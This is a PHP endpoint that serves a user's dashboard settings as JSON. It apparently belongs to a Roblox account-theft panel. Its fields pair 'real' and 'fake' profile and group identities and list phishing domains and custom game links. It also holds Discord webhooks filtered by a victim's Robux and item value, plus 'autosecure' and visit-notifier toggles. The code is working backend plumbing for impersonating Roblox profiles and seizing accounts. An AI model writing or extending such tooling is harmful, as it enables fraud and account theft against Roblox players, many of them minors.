<?php

require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/account.php" );

header( "content-type: application/json; charset=utf-8" );

$info = require_account( true );

$profile_real = trim( (string) ( $info[ "profile_real_name" ] ?? "" ) );
$profile_avatar = $profile_real !== "" ? fetch_roblox_headshot( $profile_real ) : null;

$payload = [
    "profileData" => [
        "name" => [
            "real" => $info[ "profile_real_name" ] ?? "",
            "fake" => $info[ "profile_fake_name" ] ?? "",
            "display" => $info[ "profile_display_name" ] ?? "",
            "id" => (string) ( $info[ "profile_fake_id" ] ?? "" ),
            "avatar" => $profile_avatar,
        ],
        "stats" => [
            "following" => (string) ( $info[ "profile_followings" ] ?? 0 ),
            "followers" => (string) ( $info[ "profile_followers" ] ?? 0 ),
            "friends" => (string) ( $info[ "profile_friends" ] ?? 0 ),
        ],
        "premium" => (bool) ( $info[ "profile_premium" ] ?? 0 ),
        "status" => profile_status_key( (string) ( $info[ "profile_status" ] ?? "Offline" ) ),
        "description" => $info[ "profile_description" ] ?? "",
        "createdAt" => $info[ "profile_creation_date" ] ?? "",
        "domains" => dashboard_host_list( ),
    ],
    "groupData" => [
        "group" => [
            "name" => $info[ "group_name" ] ?? "",
            "owner" => $info[ "group_owner_name" ] ?? "",
            "thumbnail" => $info[ "group_thumbnail" ] ?? "",
            "id" => (string) ( (int) ( $info[ "group_fake_id" ] ?? 0 ) ?: (int) ( $info[ "profile_fake_id" ] ?? 0 ) ),
        ],
        "stats" => [
            "members" => (int) ( $info[ "group_members" ] ?? 0 ),
            "funds" => (int) ( $info[ "group_funds" ] ?? 0 ),
        ],
        "shout" => $info[ "group_shout" ] ?? "",
        "description" => $info[ "group_description" ] ?? "",
        "domains" => dashboard_host_list( ),
    ],
    "settingsData" => [
        "minimum" => [
            "robux" => (int) ( $info[ "robux_filter" ] ?? 0 ),
            "summary" => (int) ( $info[ "summary_filter" ] ?? 0 ),
            "rap" => (int) ( $info[ "rap_filter" ] ?? 0 ),
        ],
        "webhooks" => [
            "default" => $info[ "discord_webhook" ] ?? "",
            "robux" => $info[ "robux_webhook" ] ?? "",
            "summary" => $info[ "summary_webhook" ] ?? "",
            "rap" => $info[ "rap_webhook" ] ?? "",
        ],
        "dashboard" => [
            "anonymous" => (bool) ( $info[ "dashboard_anonymous" ] ?? 0 ),
            "autosecure" => (bool) ( $info[ "dashboard_autosecure" ] ?? 0 ),
            "autoage" => (bool) ( $info[ "dashboard_autoage" ] ?? 0 ),
        ],
        "embed" => [
            "pingEveryone" => (bool) ( $info[ "discord_everyone" ] ?? 0 ),
            "pingHere" => (bool) ( $info[ "discord_here" ] ?? 0 ),
            "visitNoti" => (bool) ( $info[ "discord_visit_notifier" ] ?? 0 ),
        ],
        "customGameLink" => $info[ "custom_game_links" ] ?? "",
    ],
];

die( json_encode( $payload, JSON_UNESCAPED_SLASHES ) );
?>